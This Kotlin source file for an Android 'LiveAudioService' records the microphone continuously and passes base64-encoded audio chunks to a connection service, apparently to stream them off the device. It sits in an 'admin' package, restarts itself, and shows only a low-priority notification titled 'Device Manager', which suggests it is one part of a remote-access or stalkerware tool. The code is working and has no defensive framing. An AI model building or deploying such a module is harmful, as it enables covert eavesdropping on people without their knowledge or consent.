package com.example.admin

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Base64
import androidx.core.content.ContextCompat
import kotlin.concurrent.thread

class LiveAudioService : Service() {

    companion object {
        const val ACTION_STOP = "com.example.admin.STOP_AUDIO"
        private const val NOTIF_ID = 1003
        private const val SAMPLE_RATE = 16000
        private const val CHUNK = 1600
        @Volatile var running = false
    }

    private var record: AudioRecord? = null
    private var worker: Thread? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (!running) startRecording()
        return START_STICKY
    }

    private fun startRecording() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            stopSelf(); return
        }
        val minBuf = AudioRecord.getMinBufferSize(
            SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
        ).coerceAtLeast(CHUNK * 4)

        val r = AudioRecord(
            MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf
        )
        if (r.state != AudioRecord.STATE_INITIALIZED) {
            r.release(); stopSelf(); return
        }
        record = r
        running = true
        r.startRecording()

        worker = thread(name = "audio-worker", isDaemon = true) {
            val pcm = ShortArray(CHUNK)
            while (running) {
                val n = try { r.read(pcm, 0, pcm.size) } catch (_: Exception) { -1 }
                if (n <= 0) continue
                val bytes = ByteArray(n * 2)
                for (i in 0 until n) {
                    val v = pcm[i].toInt()
                    bytes[i * 2] = (v and 0xFF).toByte()
                    bytes[i * 2 + 1] = ((v shr 8) and 0xFF).toByte()
                }
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                ConnectionService.push(applicationContext, "audio_chunk", b64)
            }
        }
    }

    override fun onDestroy() {
        running = false
        try { record?.stop() } catch (_: Exception) {}
        try { record?.release() } catch (_: Exception) {}
        record = null
        worker = null
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(
                NotificationChannel("audio", "Audio", NotificationManager.IMPORTANCE_LOW)
            )
        }
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, "audio")
            .setContentTitle("Device Manager")
            .setContentText("Microphone active")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setOngoing(true)
            .build()
}
